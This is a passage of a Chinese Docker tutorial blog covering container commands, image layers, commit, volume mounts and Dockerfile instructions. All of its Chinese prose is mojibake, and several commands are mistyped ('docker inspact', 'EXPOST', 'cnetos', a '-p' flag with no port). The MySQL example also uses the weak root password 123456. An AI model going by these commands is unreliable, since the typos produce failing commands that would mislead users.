#æ˜¾ç¤ºæœ€è¿‘åˆ›å»ºçš„å‡ ä¸ªå®¹å™¨</span><br><span class="line">-q              #åªæ˜¾ç¤ºå®¹å™¨ç¼–å·</span><br></pre></td></tr></table></figure><h6 id="é€€å‡ºå®¹å™¨"><a href="#é€€å‡ºå®¹å™¨" class="headerlink" title="é€€å‡ºå®¹å™¨"></a>é€€å‡ºå®¹å™¨</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit          #å®¹å™¨åœæ­¢å¹¶é€€å‡º</span><br><span class="line">Ctrl +P+Q     #å®¹å™¨ä¸åœæ­¢é€€å‡º</span><br></pre></td></tr></table></figure><h6 id="åˆ é™¤å®¹å™¨"><a href="#åˆ é™¤å®¹å™¨" class="headerlink" title="åˆ é™¤å®¹å™¨"></a>åˆ é™¤å®¹å™¨</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker rm    #æ²¡æœ‰åŠ iè¯´æ˜ä¸æ˜¯imageï¼Œå°±æ˜¯å®¹å™¨äº†</span><br><span class="line">#åªrmä¸èƒ½åˆ é™¤æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼Œå¦‚æœè¦åˆ é™¤æ­£åœ¨è¿è¡Œçš„ï¼Œéœ€è¦ï¼š</span><br><span class="line">docker rm  -f</span><br><span class="line">docker rm -f $(docker ps -aq)</span><br></pre></td></tr></table></figure><h6 id="å¯åŠ¨-åœæ­¢å®¹å™¨"><a href="#å¯åŠ¨-åœæ­¢å®¹å™¨" class="headerlink" title="å¯åŠ¨&#x2F;åœæ­¢å®¹å™¨"></a>å¯åŠ¨&#x2F;åœæ­¢å®¹å™¨</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start å®¹å™¨ID       #å¯åŠ¨å®¹å™¨</span><br><span class="line">docker stop  å®¹å™¨ID       #åœæ­¢å½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span><br><span class="line">docker restart  å®¹å™¨ID    #é‡å¯å®¹å™¨</span><br><span class="line">docker kill å®¹å™¨ID        #å¼ºåˆ¶åœæ­¢å½“å‰å®¹å™¨</span><br></pre></td></tr></table></figure><h5 id="å¸¸ç”¨å…¶ä»–å‘½ä»¤"><a href="#å¸¸ç”¨å…¶ä»–å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å…¶ä»–å‘½ä»¤"></a>å¸¸ç”¨å…¶ä»–å‘½ä»¤</h5><hr><h6 id="åå°å¯åŠ¨å®¹å™¨"><a href="#åå°å¯åŠ¨å®¹å™¨" class="headerlink" title="åå°å¯åŠ¨å®¹å™¨"></a>åå°å¯åŠ¨å®¹å™¨</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#å‘½ä»¤ docker run -d é•œåƒå</span><br><span class="line">&gt; docker run -d cnetos</span><br><span class="line">#é—®é¢˜  &gt;  docker psçš„æ—¶å€™å‘ç°centosåœæ­¢äº†</span><br><span class="line">#å¸¸è§çš„å‘ï¼Œdockerå®¹å™¨ä½¿ç”¨åå°è¿è¡Œçš„ï¼Œéœ€è¦æœ‰ä¸€ä¸ªå‰å°è¿›ç¨‹ï¼Œè€Œdockerå‘ç°æ²¡æœ‰åº”ç”¨ï¼Œå°±ä¼šè‡ªåŠ¨åœæ­¢</span><br><span class="line">#æ¯”å¦‚å¯åŠ¨nginxï¼Œå®¹å™¨å¯åŠ¨åï¼Œå‘ç°è‡ªå·±æ²¡æœ‰æä¾›æœåŠ¡ï¼Œå°±ä¼šç«‹åˆ»åœæ­¢ï¼Œå°±æ˜¯æ²¡æœ‰è¿›ç¨‹äº†</span><br></pre></td></tr></table></figure><h6 id="æŸ¥çœ‹æ—¥å¿—"><a href="#æŸ¥çœ‹æ—¥å¿—" class="headerlink" title="æŸ¥çœ‹æ—¥å¿—"></a>æŸ¥çœ‹æ—¥å¿—</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f -t --tail n å®¹å™¨ID</span><br><span class="line">#æ˜¾ç¤ºæ—¥å¿—</span><br><span class="line">-tf             #æ˜¾ç¤ºæ—¥å¿—</span><br><span class="line">--tail number   #è¦æ˜¾ç¤ºçš„æ—¥å¿—æ¡æ•°</span><br></pre></td></tr></table></figure><h6 id="æŸ¥çœ‹å®¹å™¨ä¸­çš„è¿›ç¨‹ä¿¡æ¯"><a href="#æŸ¥çœ‹å®¹å™¨ä¸­çš„è¿›ç¨‹ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹å®¹å™¨ä¸­çš„è¿›ç¨‹ä¿¡æ¯"></a>æŸ¥çœ‹å®¹å™¨ä¸­çš„è¿›ç¨‹ä¿¡æ¯</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#å‘½ä»¤</span><br><span class="line">docker top å®¹å™¨ID</span><br></pre></td></tr></table></figure><h6 id="æŸ¥çœ‹è¿›ç¨‹çš„å…ƒæ•°æ®"><a href="#æŸ¥çœ‹è¿›ç¨‹çš„å…ƒæ•°æ®" class="headerlink" title="æŸ¥çœ‹è¿›ç¨‹çš„å…ƒæ•°æ®"></a>æŸ¥çœ‹è¿›ç¨‹çš„å…ƒæ•°æ®</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspact å®¹å™¨ID</span><br></pre></td></tr></table></figure><h6 id="è¿›å…¥å½“å‰æ­£åœ¨è¿›è¡Œçš„å®¹å™¨"><a href="#è¿›å…¥å½“å‰æ­£åœ¨è¿›è¡Œçš„å®¹å™¨" class="headerlink" title="è¿›å…¥å½“å‰æ­£åœ¨è¿›è¡Œçš„å®¹å™¨"></a>è¿›å…¥å½“å‰æ­£åœ¨è¿›è¡Œçš„å®¹å™¨</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#é€šå¸¸æˆ‘ä»¬å®¹å™¨éƒ½æ˜¯ä½¿ç”¨åå°çš„æ–¹å¼è¿è¡Œçš„ï¼Œæœ‰äº›æ—¶å€™æˆ‘ä»¬éœ€è¦è¿›å…¥å®¹å™¨ï¼Œä¿®æ”¹ä¸€äº›é…ç½®</span><br><span class="line"></span><br><span class="line">#å‘½ä»¤</span><br><span class="line">docker exec -it å®¹å™¨ID bashshellã€ä¾‹å¦‚/bin/bashã€‘   #-itå°±æ˜¯åˆ›å»ºä¸€ä¸ªå¯äº¤äº’çš„å®¹å™¨</span><br><span class="line">docker  attach å®¹å™¨ID bashshell   #è¿›å»ä¹‹åå°±çœ‹åˆ°æ­£åœ¨æ‰§è¡Œçš„å‘½ä»¤</span><br><span class="line">#äºŒè€…çš„åŒºåˆ«</span><br><span class="line">docker exec      #è¿›å…¥å®¹å™¨åï¼Œå¼€å¯ä¸€ä¸ªæ–°çš„ç»ˆç«¯ï¼Œå¯ä»¥åœ¨é‡Œé¢æ“ä½œ</span><br><span class="line">docker attach    #è¿›å…¥å®¹å™¨æ­£åœ¨æ‰§è¡Œçš„ç»ˆç«¯ï¼Œä¸ä¼šå¯åŠ¨æ–°çš„è¿›ç¨‹</span><br></pre></td></tr></table></figure><h6 id="ä»å®¹å™¨å†…æ‹·è´æ–‡ä»¶åˆ°ä¸»æœºä¸Š"><a href="#ä»å®¹å™¨å†…æ‹·è´æ–‡ä»¶åˆ°ä¸»æœºä¸Š" class="headerlink" title="ä»å®¹å™¨å†…æ‹·è´æ–‡ä»¶åˆ°ä¸»æœºä¸Š"></a>ä»å®¹å™¨å†…æ‹·è´æ–‡ä»¶åˆ°ä¸»æœºä¸Š</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp å®¹å™¨ID:è·¯å¾„ ç›®çš„çš„ä¸»æœºè·¯å¾„</span><br></pre></td></tr></table></figure><h3 id="Dockeré•œåƒè¯¦è§£"><a href="#Dockeré•œåƒè¯¦è§£" class="headerlink" title="Dockeré•œåƒè¯¦è§£"></a>Dockeré•œåƒè¯¦è§£</h3><hr><h6 id="é•œåƒæ˜¯ä»€ä¹ˆ"><a href="#é•œåƒæ˜¯ä»€ä¹ˆ" class="headerlink" title="é•œåƒæ˜¯ä»€ä¹ˆ"></a>é•œåƒæ˜¯ä»€ä¹ˆ</h6><hr><p>é•œåƒæ˜¯ä¸€ç§è½»é‡çº§ï¼Œå¯æ‰§è¡Œçš„ç‹¬ç«‹è½¯ä»¶åŒ…ï¼Œç”¨æ¥æ‰“åŒ…è½¯ä»¶è¿è¡Œç¯å¢ƒå’ŒåŸºäºè¿è¡Œç¯å¢ƒå¼€å‘çš„è½¯ä»¶ï¼Œå®ƒåŒ…å«è¿è¡ŒæŸä¸ªè½¯ä»¶æ‰€éœ€è¦çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬ä»£ç ã€è¿è¡Œæ—¶åº“ã€ç¯å¢ƒå˜é‡å’Œé…ç½®æ–‡ä»¶ã€‚</p><p>æ‰€æœ‰çš„åº”ç”¨ï¼Œç›´æ¥æ‰“åŒ…dockeré•œåƒï¼Œå°±å¯ä»¥ç›´æ¥è·‘èµ·æ¥</p><p>å¦‚ä½•å¾—åˆ°é•œåƒï¼š</p><ul><li>è¿œç¨‹ä»“åº“ä¸‹è½½</li><li>åˆ«äººæ‹·è´</li><li>Dockerfileè‡ªå·±åˆ¶ä½œä¸€ä¸ªé•œåƒ</li></ul><h5 id="Dockeré•œåƒåŠ è½½åŸç†"><a href="#Dockeré•œåƒåŠ è½½åŸç†" class="headerlink" title="Dockeré•œåƒåŠ è½½åŸç†"></a>Dockeré•œåƒåŠ è½½åŸç†</h5><hr><blockquote><p>UnionFS(è”åˆæ–‡ä»¶ç³»ç»Ÿ)</p></blockquote><p>UnionFS(è”åˆæ–‡ä»¶ç³»ç»Ÿ):Unionæ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ç§åˆ†å±‚ï¼Œè½»é‡çº§å¹¶ä¸”é«˜æ€§èƒ½çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒæ”¯æŒå¯¹æ–‡ä»¶ç³»ç»Ÿçš„ä¿®æ”¹ä½œä¸ºä¸€æ¬¡æäº¤æ¥ä¸€å±‚å±‚çš„å åŠ ï¼ŒåŒæ—¶å¯ä»¥å°†ä¸åŒçš„ç›®å½•æŒ‚è½½åˆ°åŒä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿä¸‹(unite several directories into a single virtual filesystem)ã€‚Unionæ–‡ä»¶ç³»ç»Ÿæ˜¯Dockeré•œåƒçš„åŸºç¡€ï¼Œé•œåƒå¯ä»¥é€šè¿‡åˆ†å±‚æ¥è¿›è¡Œç»§æ‰¿ï¼ŒåŸºäºåŸºç¡€é•œåƒ(æ²¡æœ‰çˆ¶é•œåƒ)ï¼Œå¯ä»¥åˆ¶ä½œå„ç§å…·ä½“çš„åº”ç”¨é•œåƒ</p><p>ç‰¹æ€§ï¼šä¸€æ¬¡åŒæ—¶åŠ è½½å¤šä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä½†ä»å¤–é¢çœ‹èµ·æ¥ï¼Œåªèƒ½çœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œè”åˆåŠ è½½ä¼šå§å„å±‚æ–‡ä»¶ç³»ç»Ÿå åŠ èµ·æ¥ï¼Œè¿™æ ·æœ€ç»ˆçš„æ–‡ä»¶ç³»ç»Ÿä¼šåŒ…å«æ‰€æœ‰åº•å±‚çš„æ–‡ä»¶å’Œç›®å½•ã€‚</p><h6 id="é•œåƒä¸å®¹å™¨"><a href="#é•œåƒä¸å®¹å™¨" class="headerlink" title="é•œåƒä¸å®¹å™¨"></a>é•œåƒä¸å®¹å™¨</h6><p>Dockeré•œåƒéƒ½æ˜¯åªè¯»çš„ï¼Œå½“å®¹å™¨å¯åŠ¨ä¹‹åï¼Œä¸€ä¸ªæ–°çš„å¯å†™å±‚è¢«åŠ è½½åˆ°é•œåƒçš„é¡¶éƒ¨</p><p>è¿™ä¸€å±‚å°±æ˜¯æˆ‘ä»¬é€šå¸¸è¯´çš„å®¹å™¨å±‚ï¼Œå®¹å™¨ä¹‹ä¸‹çš„éƒ½å«é•œåƒå±‚ã€‚æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªé•œåƒï¼Œç„¶årunäº†ä¹‹ååœ¨é‡Œé¢ä¿®æ”¹é…ç½®æˆ–è€…è¿›è¡Œå…¶ä»–æ“ä½œï¼Œè¿™äº›æ“ä½œéƒ½æ˜¯åŸºäºå®¹å™¨å±‚çš„ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¦æŠŠå®ƒå‘ç»™å…¶ä»–äººï¼Œéœ€è¦æŠŠå®¹å™¨å’Œé•œåƒä¸€èµ·å†é‡æ–°æ‰“åŒ…ã€‚</p><h5 id="commité•œåƒ"><a href="#commité•œåƒ" class="headerlink" title="commité•œåƒ"></a>commité•œåƒ</h5><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker commit æäº¤å®¹å™¨ä¸ºä¸€ä¸ªæ–°çš„å‰¯æœ¬</span><br><span class="line">docker commit -m=&#x27;æäº¤çš„æè¿°ä¿¡æ¯&#x27; -a=&#x27;ä½œè€…&#x27; å®¹å™¨ID ç›®æ ‡é•œåƒå:[TAG]</span><br></pre></td></tr></table></figure><h6 id="å®æˆ˜æ“ä½œ"><a href="#å®æˆ˜æ“ä½œ" class="headerlink" title="å®æˆ˜æ“ä½œ"></a>å®æˆ˜æ“ä½œ</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#1.å¯åŠ¨ä¸€ä¸ªé»˜è®¤çš„Tomcat</span><br><span class="line">#2.å‘ç°é»˜è®¤çš„Tomcatæ˜¯æ²¡æœ‰webappså¼•ç”¨çš„ï¼Œè¿™æ˜¯é•œåƒçš„åŸå› ï¼Œå®˜æ–¹é»˜è®¤çš„webappsä¸‹é¢æ˜¯æ²¡æœ‰æ–‡ä»¶çš„</span><br><span class="line">#3.äºæ˜¯æˆ‘ä»¬è¿›å…¥å®¹å™¨ï¼Œè‡ªå·±æ‹·è´è¿›å»äº†åŸºæœ¬çš„æ–‡ä»¶</span><br><span class="line">#4.å°†æˆ‘ä»¬æ“ä½œè¿‡çš„å®¹å™¨é€šè¿‡commitæäº¤ä¸ºä¸€ä¸ªæ–°çš„é•œåƒ</span><br><span class="line">#ä»¥åå°±å¯ä»¥ç›´æ¥ä½¿ç”¨æˆ‘ä»¬ä¿®æ”¹è¿‡çš„é•œåƒ</span><br><span class="line"></span><br><span class="line">docker commit -m=&#x27;add webapps app&#x27; -a=&#x27;psych&#x27; é•œåƒID Tomcat01:1.0</span><br></pre></td></tr></table></figure><h3 id="å®¹å™¨æ•°æ®å·"><a href="#å®¹å™¨æ•°æ®å·" class="headerlink" title="å®¹å™¨æ•°æ®å·"></a>å®¹å™¨æ•°æ®å·</h3><hr><h6 id="ä»€ä¹ˆæ˜¯å®¹å™¨æ•°æ®å·"><a href="#ä»€ä¹ˆæ˜¯å®¹å™¨æ•°æ®å·" class="headerlink" title="ä»€ä¹ˆæ˜¯å®¹å™¨æ•°æ®å·"></a>ä»€ä¹ˆæ˜¯å®¹å™¨æ•°æ®å·</h6><hr><p>dockerç†å¿µå›é¡¾ï¼šå°†åº”ç”¨å’Œç¯å¢ƒæ‰“åŒ…æˆä¸€ä¸ªé•œåƒ</p><p>ä½†æ˜¯å¦‚æœæ•°æ®éƒ½åœ¨å®¹å™¨ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†å®¹å™¨åˆ é™¤çš„æ—¶å€™é‡Œé¢çš„æ•°æ®ä¹Ÿä¼šè·Ÿç€ä¸¢å¤±ï¼Œæ‰€ä»¥éœ€æ±‚æ˜¯å¦‚ä½•ä½¿æ•°æ®å¯æŒä¹…åŒ–ã€‚æ‰€ä»¥æˆ‘ä»¬æ€¥éœ€ä¸€ä¸ªå®¹å™¨ä¹‹é—´å¯ä»¥æ•°æ®å…±äº«çš„æŠ€æœ¯ï¼Œä¹Ÿå°±æ˜¯<strong>å®¹å™¨æ•°æ®å·</strong>çš„æŠ€æœ¯</p><p>æœ¬è´¨ä¸Šå°±æ˜¯ç›®å½•çš„æŒ‚è½½æŠ€æœ¯ï¼Œå°†å®¹å™¨å†…çš„ç›®å½•æŒ‚è½½åˆ°Linuxä¸»æœºä¸Š</p><p><strong>æ€»ç»“ä¸€å¥è¯ï¼šæ•°æ®çš„æŒä¹…åŒ–å’ŒåŒæ­¥æ“ä½œ</strong></p><hr><blockquote><p>æ–¹å¼ä¸€ï¼šç›´æ¥ä½¿ç”¨å‘½ä»¤<code>-v</code>æŒ‚è½½</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v ä¸»æœºç›®å½•:å®¹å™¨å†…ç›®å½•    #å’Œç«¯å£æ˜ å°„å¾ˆç±»ä¼¼</span><br></pre></td></tr></table></figure><h6 id="å®æˆ˜æ“ä½œï¼šMySQLå®‰è£…é…ç½®"><a href="#å®æˆ˜æ“ä½œï¼šMySQLå®‰è£…é…ç½®" class="headerlink" title="å®æˆ˜æ“ä½œï¼šMySQLå®‰è£…é…ç½®"></a>å®æˆ˜æ“ä½œï¼šMySQLå®‰è£…é…ç½®</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#è·å–é•œåƒ</span><br><span class="line">&gt; docker pull mysql:5.7</span><br><span class="line">#è¿è¡Œå®¹å™¨ï¼Œéœ€è¦åšæ•°æ®æŒ‚è½½ï¼›å®‰è£…å¯åŠ¨mysqlï¼Œéœ€è¦é…ç½®å¯†ç ï¼Œè¿™æ˜¯è¦æ³¨æ„çš„ç‚¹</span><br><span class="line">#å®˜æ–¹å‘½ä»¤ï¼š</span><br><span class="line">docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag</span><br><span class="line">#å¯åŠ¨æˆ‘ä»¬çš„ï¼š</span><br><span class="line">docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql  -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span><br><span class="line"></span><br><span class="line">#è§£é‡Š</span><br><span class="line">-d                    #åå°è¿è¡Œ</span><br><span class="line">-p                    #ç«¯å£æ˜ å°„</span><br><span class="line">-v                    #å·æŒ‚è½½</span><br><span class="line">-e                    #ç¯å¢ƒé…ç½®,è®¾ç½®mysqlç™»å½•å¯†ç </span><br><span class="line">--name                #è®¾ç½®å®¹å™¨å</span><br></pre></td></tr></table></figure><h6 id="å…·åå’ŒåŒ¿åæŒ‚è½½"><a href="#å…·åå’ŒåŒ¿åæŒ‚è½½" class="headerlink" title="å…·åå’ŒåŒ¿åæŒ‚è½½"></a>å…·åå’ŒåŒ¿åæŒ‚è½½</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#åŒ¿åæŒ‚è½½ </span><br><span class="line">-v å®¹å™¨è·¯å¾„</span><br><span class="line">docker run -d -p --name nginx -v /etc/nginx nginx        #ä¸æŒ‡å®šä¸»æœºå</span><br><span class="line">#ç°åœ¨æˆ‘ä»¬æ¥æŸ¥çœ‹æ‰€æœ‰çš„volume[å·]çš„æƒ…å†µ</span><br><span class="line">docker volume ls</span><br><span class="line">#å°±ä¼šæ˜¾ç¤ºå¾ˆå¤šåŒ¿åæŒ‚è½½ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨-vçš„æ—¶å€™åªå†™äº†å®¹å™¨å†…çš„è·¯å¾„ï¼Œæ²¡æœ‰å†™å®¹å™¨å¤–çš„è·¯å¾„</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#å…·åæŒ‚è½½</span><br><span class="line">docker run -d -P --name nginx01 -v juming-nginx:/etc/nginx nginx</span><br><span class="line">#ç„¶åæˆ‘ä»¬å†æ¬¡æŸ¥çœ‹volumeçš„æ—¶å€™å°±ä¼šçœ‹åˆ°ä¸€ä¸ªjuming-nginxçš„å·ï¼Œè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬çš„å…·åæŒ‚è½½ã€‚</span><br><span class="line">#ç„¶åæˆ‘ä»¬è¦æŸ¥çœ‹ä¸€ä¸ªå·åˆ°åº•æŒ‚è½½åˆ°å“ªé‡Œäº†ï¼Œå°±æ˜¯ç”¨inspectæŸ¥çœ‹è¯¦ç»†æ•°æ®å°±å¯ä»¥</span><br><span class="line">&gt; docker volume inspect juming-nginx</span><br></pre></td></tr></table></figure><p>æ‰€æœ‰dockerå®¹å™¨å†…çš„å·ï¼Œæ²¡æœ‰æŒ‡å®šå®¹å™¨å¤–çš„è·¯å¾„çš„è¯ï¼Œå°±ä¼šé»˜è®¤æ”¾åœ¨</p><p><code>/var/lib/docker/volumes/xxx/_data</code>è¿™ä¸ªè·¯å¾„ä¸‹é¢ã€‚</p><h6 id="æŒ‚è½½åˆ†ç±»"><a href="#æŒ‚è½½åˆ†ç±»" class="headerlink" title="æŒ‚è½½åˆ†ç±»"></a>æŒ‚è½½åˆ†ç±»</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-v  å®¹å™¨å†…è·¯å¾„                     #åŒ¿åæŒ‚è½½</span><br><span class="line">-v  å·å:å®¹å™¨å†…è·¯å¾„                #å…·åæŒ‚è½½</span><br><span class="line">-v  /å®¿ä¸»æœºè·¯å¾„:å®¹å™¨å†…è·¯å¾„          #æŒ‡å®šè·¯å¾„æŒ‚è½½</span><br></pre></td></tr></table></figure><hr><blockquote><p>æ–¹å¼äºŒï¼šåˆ©ç”¨Dockerfileæ¥æ„å»ºdockeré•œåƒ</p></blockquote><p>Dockerfileå…¶å®å°±æ˜¯ä¸€ä¸ªå‘½ä»¤è„šæœ¬,ç„¶åé€šè¿‡ä¸€ä¸ªè„šæœ¬æ¥ç”Ÿæˆä¸€ä¸ªé•œåƒï¼Œé•œåƒæ˜¯ä¸€å±‚ä¸€å±‚çš„ï¼Œè„šæœ¬æ˜¯ä¸€è¡Œä¸€è¡Œçš„å‘½ä»¤ï¼Œå¯¹åº”ä¸€å±‚ä¸€å±‚çš„é•œåƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#Dockerfileå†…å®¹ç¼–å†™  -&gt;  æŒ‡ä»¤ å‚æ•°    </span><br><span class="line">#æ‰€æœ‰çš„æŒ‡ä»¤éƒ½æ˜¯å¤§å†™  </span><br><span class="line">FROM centos</span><br><span class="line"></span><br><span class="line">VOLUME[&quot;volume01&quot;,&quot;volume02&quot;]    # æŒ‚è½½å·,åŒ¿åæŒ‚è½½ï¼Œé€šè¿‡docker inspectæ¥æŸ¥çœ‹è·¯å¾„</span><br><span class="line"></span><br><span class="line">CMD echo&quot;__end__&quot;</span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -f Dockerfile -t psych-centos:1.0 .</span><br></pre></td></tr></table></figure><h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><hr><p>dockerfileæ˜¯ç”¨æ¥æ„å»ºdockeré•œåƒçš„æ–‡ä»¶ï¼å‘½ä»¤å‚æ•°è„šæœ¬ã€‚</p><p>æ„å»ºæ­¥éª¤ï¼š</p><ul><li>ç¼–å†™ä¸€ä¸ªDockerfileæ–‡ä»¶</li><li>docker build æ„å»ºæˆä¸ºä¸€ä¸ªé•œåƒ</li><li>docker run è¿è¡Œé•œåƒ</li><li>docker push å‘å¸ƒé•œåƒ(DockerHubã€é˜¿é‡Œäº‘é•œåƒä»“åº“)</li></ul><h5 id="DOckerfileæ„å»ºè¿‡ç¨‹"><a href="#DOckerfileæ„å»ºè¿‡ç¨‹" class="headerlink" title="DOckerfileæ„å»ºè¿‡ç¨‹"></a>DOckerfileæ„å»ºè¿‡ç¨‹</h5><hr><p><strong>åŸºç¡€çŸ¥è¯†</strong>ï¼š</p><ul><li>æ¯ä¸ªä¿ç•™å…³é”®å­—(æŒ‡ä»¤)å¿…é¡»éƒ½æ˜¯å¤§å†™å­—æ¯</li><li>æ‰§è¡Œä»ä¸Šåˆ°ä¸‹é¡ºåºæ‰§è¡Œ</li><li><code>#</code>è¡¨ç¤ºæ³¨é‡Š</li><li>æ¯ä¸€ä¸ªæŒ‡ä»¤éƒ½ä¼šå»åˆ›å»ºæäº¤ä¸€ä¸ªæ–°çš„é•œåƒå±‚</li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230724120145007.png"></p><p>Dockerfileæ˜¯é¢å‘å¼€å‘çš„ï¼ŒDockeré•œåƒå·²ç»é€æ¸ç§°ä¸ºä¼ä¸šäº¤ä»˜çš„æ ‡å‡†</p><p>Dockerfileï¼šæ„å»ºæ–‡ä»¶ï¼Œå®šä¹‰äº†ä¸€åˆ‡çš„æ­¥éª¤ï¼Œæºä»£ç </p><p>DockerImageï¼šé€šè¿‡Dockerfileæ„å»ºç”Ÿæˆçš„é•œåƒï¼Œæœ€ç»ˆå‘å¸ƒå’Œè¿è¡Œçš„äº§å“</p><p>Dockerå®¹å™¨ï¼šå®¹å™¨å°±æ˜¯é•œåƒè¿è¡Œèµ·æ¥æä¾›æœåŠ¡çš„</p><h5 id="DockerfileæŒ‡ä»¤"><a href="#DockerfileæŒ‡ä»¤" class="headerlink" title="DockerfileæŒ‡ä»¤"></a>DockerfileæŒ‡ä»¤</h5><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FROM             #åŸºç¡€é•œåƒï¼Œä¸€åˆ‡ä»è¿™é‡Œå¼€å§‹æ„å»º</span><br><span class="line">MAINTAINER       #é•œåƒæ˜¯è°å†™çš„ï¼Œå§“åï¼‹é‚®ç®±</span><br><span class="line">RUN              #é•œåƒæ„å»ºçš„æ—¶å€™éœ€è¦è¿è¡Œçš„å‘½ä»¤</span><br><span class="line">ADD              #æ­¥éª¤ï¼šæ¯”å¦‚ï¼šTomcaté•œåƒï¼Œå°±éœ€è¦åœ¨centosçš„åŸºç¡€é•œåƒä¸­æ·»åŠ Tomcatå‹ç¼©åŒ…</span><br><span class="line">WORKDIR          #é•œåƒçš„å·¥ä½œç›®å½•</span><br><span class="line">VOLUME           #æŒ‚è½½çš„ç›®å½•</span><br><span class="line">EXPOST           #æš´éœ²ç«¯å£</span><br><span class="line">CMD              #æŒ‡å®šè¿™ä¸ªå®¹å™¨å¯åŠ¨çš„æ—¶å€™è¦è¿è¡Œçš„å‘½ä»¤ï¼Œä¹‹åæœ€åä¸€ä¸ªä¼šç”Ÿæ•ˆï¼Œå¯è¢«æ›¿ä»£</span><br><span class="line">ENTRYPOINT       #æŒ‡å®šè¿™ä¸ªå®¹å™¨å¯åŠ¨çš„æ—¶å€™è¦è¿è¡Œçš„å‘½ä»¤ï¼Œå¯ä»¥è¿½åŠ å‘½ä»¤</span><br><span class="line">ONBUILD          #å½“æ„å»ºä¸€ä¸ªè¢«ç»§æ‰¿çš„Dockerfileï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šè§¦å‘ONBUILDã€‚</span><br><span class="line">COPY             